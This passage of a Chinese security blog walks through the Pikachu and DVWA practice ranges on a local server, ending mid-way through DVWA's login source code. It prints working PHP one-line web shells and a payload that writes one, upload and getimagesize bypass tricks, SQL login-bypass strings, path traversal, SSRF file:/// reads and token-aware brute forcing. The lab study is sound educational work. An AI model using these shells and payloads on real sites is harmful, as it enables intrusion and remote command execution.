<p>可以在url上看到这是一个文件file1.php</p>
<p>再尝试一下选择其他人物，发现文件依次变成了file2.php, file3.php, file4.php, file5.php</p>
<p>访问当前网页所在的文件目录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231529459.jpg" alt="img"></p>
<p>发现有一个file6.php，查看该文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231529855.jpg" alt="img"></p>
<p>原来这是一个包含用户名和密码的文件</p>
<p>配合文件上传getshell，在Unsafe Fileupload处随便选一道题上传带有一句话木马的图片文件test.jpg（这里是用的getimagesize题里的）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231529890.jpg" alt="img"></p>
<p>确定路径后回到题目构造payload：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/10/19/1759586530d08b36cd4162146851.jpg&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231529923.jpg" alt="img"></p>
<p>可以看到上传成功，用蚁剑连接，连接成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231529959.gif" alt="img"></p>

        <h2 id="远程文件包含"   >
          <a href="#远程文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231531378.png" alt="image-20240523153105340"></p>
<p>还是随机选一个提交</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231531906.jpg" alt="img"></p>
<p>首先生成一个文本文件remote.txt部署在服务器上,放在phpstudy的根目录下，写入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd]) ?&gt; &#x27; ); ?&gt;</span><br></pre></td></tr></table></div></figure>

<p>构造payload：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[http://localhost/pikachu/vul/fileinclude/fi_remote.php?filename=D:\phpstudy_pro\WWW\pikachu\remote.txt&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></div></figure>

<p>然后发现shell.php文件已经写入该网页的目录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231531904.jpg" alt="img"></p>
<p>然后用蚁剑连接（URL地址应该是shell.php文件所在目录），连接成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231531901.jpg" alt="img"></p>

        <h1 id="不安全的文件下载"   >
          <a href="#不安全的文件下载" class="heading-link"><i class="fas fa-link"></i></a><a href="#不安全的文件下载" class="headerlink" title="不安全的文件下载"></a>不安全的文件下载</h1>
      <p>首先我们在该网页的目录D:\phpstudy_pro\WWW\pikachu\vul\unsafedownload\download下新建一个文本文档download.txt，写入111</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231533978.jpg" alt="img"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231533980.jpg" alt="img"></p>
<p>随便选择一个名字右键选择“在新窗口中打开链接”，这时它会下载该图片，同时新窗口也会显示该图片的链接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231533987.jpg" alt="img"></p>
<p>修改filename为download.txt，回车</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231533988.jpg" alt="img"></p>
<p>即开始下载download.txt文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231533993.jpg" alt="img"></p>
<p>可以看到下载成功</p>

        <h1 id="文件上传"   >
          <a href="#文件上传" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1>
      
        <h2 id="客户端check"   >
          <a href="#客户端check" class="heading-link"><i class="fas fa-link"></i></a><a href="#客户端check" class="headerlink" title="客户端check"></a>客户端check</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231534067.jpg" alt="img"></p>
<p>上传写入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;])?&gt;</span><br></pre></td></tr></table></div></figure>

<p>的test.jpg文件，同时抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231534069.jpg" alt="img"></p>
<p>发送到Repeater后修改文件后缀为php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231534082.jpg" alt="img"></p>
<p>发送之后可以在“响应”内看到修改后的上传的文件的路径</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231534084.jpg" alt="img"></p>
<p>按这个路径到蚁剑进行连接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231534078.jpg" alt="img"></p>
<p>连接成功</p>

        <h2 id="服务端check"   >
          <a href="#服务端check" class="heading-link"><i class="fas fa-link"></i></a><a href="#服务端check" class="headerlink" title="服务端check"></a>服务端check</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231535490.png" alt="image-20240523153514455"></p>
<p>服务端MIME类型检测是通过检查http包的Content-Type字段中的值来判断上传文件是否合法的，所以我们可以上传php文件，只需要抓包修改content-type修改就行</p>
<p>上传写入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_REQUEST[&#x27;shell&#x27;])?&gt;</span><br></pre></td></tr></table></div></figure>

<p>的test.php文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231535842.jpg" alt="img"></p>
<p>抓包并发送到Repeater修改Content-Type为image/jpeg</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231535846.jpg" alt="img"></p>
<p>发送后可以看到上传成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231535847.jpg" alt="img"></p>
<p>再用蚁剑连接，连接成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231535862.jpg" alt="img"></p>

        <h2 id="getimagesize"   >
          <a href="#getimagesize" class="heading-link"><i class="fas fa-link"></i></a><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231537198.jpg" alt="img"></p>
<p>getimagesize()这个函数功能会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的, 可在木马文件内容头部添加GIF89a(Gif图片文件头)</p>
<p>所以可以利用client check题里的jpg文件直接进行上传</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231537196.jpg" alt="img"></p>
<p>上传成功，再用文件包含漏洞里构造的payload连接蚁剑，连接成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231537203.jpg" alt="img"></p>

        <h1 id="越权"   >
          <a href="#越权" class="heading-link"><i class="fas fa-link"></i></a><a href="#越权" class="headerlink" title="越权"></a>越权</h1>
      
        <h2 id="水平越权"   >
          <a href="#水平越权" class="heading-link"><i class="fas fa-link"></i></a><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231537537.jpg" alt="img"></p>
<p>点击提示，选择lucy的账号进行登录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231538123.jpg" alt="img"></p>
<p>点击“点击查看个人信息”</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231538131.jpg" alt="img"></p>
<p>可以看到url也变化了，试试修改url上的username为lili，回车</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231538133.jpg" alt="img"></p>
<p>可以看到登录账号换成了lili，个人信息也都变成了lili的信息</p>

        <h2 id="垂直越权"   >
          <a href="#垂直越权" class="heading-link"><i class="fas fa-link"></i></a><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231538194.jpg" alt="img"></p>
<p>直接登录超级boss的账号</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231538674.jpg" alt="img"></p>
<p>再登录pikachu账号看看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231538675.jpg" alt="img"></p>
<p>只有超级boss才有添加用户的权限，那么关键也在添加用户权限这里，那么重新登录admin账号添加用户</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231538677.jpg" alt="img"></p>
<p>复制url后退出登录，再次登录pikachu的账号，然后粘贴刚刚复制的url，可以看到现在已经是pikachu在操作添加用户了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231538678.jpg" alt="img"></p>
<p>点击“创建”后再次登录pikachu的账号查看，可以看到用pikachu账号添加用户成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231538691.jpg" alt="img"></p>

        <h1 id="目录遍历"   >
          <a href="#目录遍历" class="heading-link"><i class="fas fa-link"></i></a><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231539650.png" alt="image-20240523153932619"></p>
<p>随便点击一个链接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231539286.jpg" alt="img"></p>
<p>可以看到变量title是文件名，我们可以更改为上级目录下的dir.php文件，即构造</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=../dir.php</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231539293.jpg" alt="img"></p>
<p>成功打开了该文件</p>

        <h1 id="敏感信息泄露"   >
          <a href="#敏感信息泄露" class="heading-link"><i class="fas fa-link"></i></a><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1>
      <p>提示我们很多地方都漏点，查看网页源代码， 发现有注释掉的测试用户的账号密码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231541457.png" alt="image-20240523154108422"></p>
<p>登录一下， 登录成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231540439.jpg" alt="img"></p>

        <h1 id="PHP反序列化"   >
          <a href="#PHP反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231541664.png" alt="image-20240523154156629"></p>
<p>简单构造一个序列化的数据，插入XSS代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class S &#123;</span><br><span class="line">    public $test = &quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$test = new S();</span><br><span class="line"></span><br><span class="line">// 序列化</span><br><span class="line">$serialized = serialize($test);</span><br><span class="line">echo &quot;序列化后的用户对象：&quot; . $serialized . &quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>序列化结果为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></div></figure>

<p>输入并提交，出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231557379.png" alt="image-20240523155718329"></p>

        <h1 id="XXE漏洞"   >
          <a href="#XXE漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1>
      <p>DTD, 即文档定义类型, 用来为XML文档定义语义约束</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--声明xml的版本号--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!--定义此文档是note类型的文档--&gt;</span><br><span class="line">&lt;!DOCTYPE note[ &lt;!--外部实体声明--&gt;    </span><br><span class="line">&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt;]&gt;&lt;!--文档元素--&gt; </span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;head&gt;Reminder&lt;/head&gt;</span><br><span class="line">&lt;body&gt;You are a good man&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231557501.jpg" alt="img"></p>
<p>可以构建恶意xml通过post请求提交，在输入框内输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY test &quot;hey&quot;&gt;</span><br><span class="line">]&gt;&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231557502.jpg" alt="img"></p>
<p>有返回hey</p>

        <h1 id="URL重定向"   >
          <a href="#URL重定向" class="heading-link"><i class="fas fa-link"></i></a><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h1>
      <p> <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231559072.jpg" alt="img"></p>
<p> 依次点击每一条链接，到“像秋天的风一样的少年”才会有网页跳转，跳转到unsafere.php <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231559073.jpg" alt="img"></p>
<p> 点击“我就是我，放荡不羁的我”网页也发生了跳转</p>
<p> <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231559079.jpg" alt="img"></p>
<p> 多了一个url参数，既然是url，那试着修改为另一个网页，比如<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.bilibili.com,跳转到了bilibili网页端/" >http://www.bilibili.com，跳转到了bilibili网页端</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231559568.png" alt="image-20240523155959513"></p>

        <h1 id="SSRF"   >
          <a href="#SSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1>
      
        <h2 id="SSRF-curl"   >
          <a href="#SSRF-curl" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231600089.png" alt="image-20240523160048059"></p>
<p>点击链接后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231601155.jpg" alt="img"></p>
<p>多了一个url参数，试着给url传入<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.baidu.com/" >http://www.baidu.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231601157.jpg" alt="img"></p>
<p>有访问到，再试试访问本地文件（先在pikachu目录下新建文本文档1.txt，写入123）,给url传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///D:/phpstudy_pro/WWW/pikachu/1.txt</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231601163.jpg" alt="img"></p>

        <h2 id="SSRF-file-get-content"   >
          <a href="#SSRF-file-get-content" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h2>
      
        <h6 id="file-get-content函数-该函数的作用是读取文件的内容，可以对本地文件进行读取，也可以对远程文件进行读取"   >
          <a href="#file-get-content函数-该函数的作用是读取文件的内容，可以对本地文件进行读取，也可以对远程文件进行读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#file-get-content函数-该函数的作用是读取文件的内容，可以对本地文件进行读取，也可以对远程文件进行读取" class="headerlink" title="file_get_content函数, 该函数的作用是读取文件的内容，可以对本地文件进行读取，也可以对远程文件进行读取"></a>file_get_content函数, 该函数的作用是读取文件的内容，可以对本地文件进行读取，也可以对远程文件进行读取</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231602294.png" alt="image-20240523160219260"></p>
<p>点击链接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231602944.jpg" alt="img"></p>
<p>url传入了file参数，可以和上一题一样试着传入百度的网址：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.baidu.com/" >http://www.baidu.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231602943.jpg" alt="img"></p>
<p>再试试访问本地文件,给url传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///D:/phpstudy_pro/WWW/pikachu/1.txt</span><br></pre></td></tr></table></div></figure>

<p>(已经将文档内容改为456)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231602949.jpg" alt="img"></p>
<p>访问成功</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/19/DVWA%E9%9D%B6%E5%9C%BA/">DVWA-学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-07-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h2 id="一、暴力破解"   >
          <a href="#一、暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、暴力破解" class="headerlink" title="一、暴力破解"></a>一、暴力破解</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405192112109.png" alt="image-20240519211247063"></p>

        <h2 id="Low"   >
          <a href="#Low" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low" class="headerlink" title="Low"></a>Low</h2>
      <p>随便输入一个账号密码登录，然后抓包发送到攻击器</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405191935953.png" alt="image-20240519193557877"></p>
<p>选好payload位置，开始暴力破解</p>
<p>最后爆破出来账号是admin 密码是password</p>
<p>看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405191938732.png" alt="image-20240519193820686"></p>
<p>可以看到只有一句简单的查询语句，也可以利用sql注入的漏洞，已知账号后在账号栏内输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></div></figure>

<p>或是</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;-- (注意后面还有一个空格)</span><br></pre></td></tr></table></div></figure>

<p>密码随意，也能成功登录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405191941261.png" alt="image-20240519194158205"></p>

        <h2 id="Medium"   >
          <a href="#Medium" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2>
      <p>暴力破解也能破，但是查看源代码后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405192110071.png" alt="image-20240519211043996"></p>
<p>可以看到使用了<code>mysqli_real_escape_string</code>函数来防止SQL注入</p>
<p>所以到了中等难度时就必须得知道账号和密码才行</p>

        <h2 id="High"   >
          <a href="#High" class="heading-link"><i class="fas fa-link"></i></a><a href="#High" class="headerlink" title="High"></a>High</h2>
      <p>抓包后可以看到多了令牌</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405192118023.png" alt="image-20240519211856968"></p>
<p>而且提交之后令牌又发生了改变，之后该令牌值和页面提交一起传至服务端进行验证。服务端收到请求后，首先判断token的值是否合法，再进行sql查询</p>
<p>查看源代码发现</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201434435.png" alt="image-20240520143405390"></p>
<p>通过<code>checkToken</code>函数验证提交的表单中的<code>user_token</code>与会话中的<code>session_token</code>是否一致。这有助于防止跨站请求伪造攻击，代码在每次请求结束时通过<code>generateSessionToken</code>函数刷新CSRF令牌，以增强会话的安全性。</p>
<p>使用stripslashes去除转义字符，防止转义字符影响 SQL 查询的语法，尤其是在使用旧的 PHP 版本或配置不当的服务器上；并且数据清洗，在将数据存储到数据库之前，去除不必要的转义，以确保数据的准确性和预期的处理。</p>

        <h6 id="有token时的burpsuite暴力破解"   >
          <a href="#有token时的burpsuite暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#有token时的burpsuite暴力破解" class="headerlink" title="有token时的burpsuite暴力破解"></a>有token时的burpsuite暴力破解</h6>
      <p>抓包发送到Intruder后，将username、password、user_token进行<code>add$</code>操作，然后选择交叉攻击（假如有两个标志位置，那么发起攻击后进行攻击的顺序为a1,b1、a2,b2…）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201414105.png" alt="image-20240520141424996"></p>
<p>再在“选项”里找到Grep-Extract，点击“添加”，再点击“获取响应”后选择token</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201418002.png" alt="image-20240520141815942"></p>
<p>复制这个token，点击“确认”</p>
<p>重定向选择“总是”</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201418199.png" alt="image-20240520141856172"></p>
<p>资源池设置线程为1（不支持多线程）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201419517.png" alt="image-20240520141949457"></p>
<p>“payload”里前两个依次设置对应好，第3个payload集类型为递归提取，并把复制的token粘贴刀初始payload</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201420588.png" alt="image-20240520142052542"></p>
<p>开始攻击</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201422809.png" alt="image-20240520142212762"></p>
<p>成功</p>

        <h2 id="Impossible"   >
          <a href="#Impossible" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Login&#x27; ] ) &amp;&amp; isset ($_POST[&#x27;username&#x27;]) &amp;&amp; isset ($_POST[&#x27;password&#x27;]) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Sanitise username input</span><br><span class="line">    $user = $_POST[ &#x27;username&#x27; ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    // Sanitise password input</span><br><span class="line">    $pass = $_POST[ &#x27;password&#x27; ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    // Default values</span><br><span class="line">    $total_failed_login = 3;</span><br><span class="line">    $lockout_time       = 15;</span><br><span class="line">    $account_locked     = false;</span><br><span class="line"></span><br><span class="line">    // Check the database (Check user information)</span><br><span class="line">    $data = $db-&gt;prepare( &#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27; );</span><br><span class="line">    $data-&gt;bindParam( &#x27;:user&#x27;, $user, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    // Check to see if the user has been locked out.</span><br><span class="line">    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &#x27;failed_login&#x27; ] &gt;= $total_failed_login ) )  &#123;</span><br><span class="line">        // User locked out.  Note, using this method would allow for user enumeration!</span><br><span class="line">        //echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        // Calculate when the user would be allowed to login again</span><br><span class="line">        $last_login = strtotime( $row[ &#x27;last_login&#x27; ] );</span><br><span class="line">        $timeout    = $last_login + ($lockout_time * 